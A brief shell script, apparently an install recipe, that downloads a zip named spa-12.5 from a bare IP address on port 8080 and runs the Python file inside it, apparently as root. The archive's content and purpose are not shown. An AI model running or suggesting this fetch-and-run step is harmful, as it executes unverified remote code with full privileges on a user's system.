apt update
apt install python3-pip zip -y
pip install requests
mkdir /root/spa
cd /root/spa
wget http://20.187.190.201:8080/wp-content/uploads/2022/12/spa-12.5.zip
unzip spa-12.5.zip
python3 spa-12.5.py
